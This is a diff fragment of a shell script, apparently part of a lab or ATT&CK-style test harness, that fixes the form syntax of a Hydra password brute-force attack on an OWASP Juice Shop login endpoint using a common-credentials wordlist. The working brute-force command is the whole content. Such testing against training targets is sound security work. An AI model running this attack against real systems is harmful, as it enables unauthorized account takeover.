@@ -19,7 +19,7 @@ echo "admin@example.com" >/tmp/mitre-users-$$.txt
 hydra -L /tmp/mitre-users-$$.txt \
   -P /opt/seclists/Passwords/Common-Credentials/best15.txt \
   -s 443 "$TARGET" https-post-form \
-  "/juice-shop/rest/user/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:H=Content-Type\: application/json:1=:F=Invalid" \
+  "/juice-shop/rest/user/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:H=Content-Type\: application/json:F=Invalid" \
   -t 4 -f -I 2>&1 | grep -E "(login:|valid|host:|Hydra)" | sed -n '1,5p'
 echo ""
 
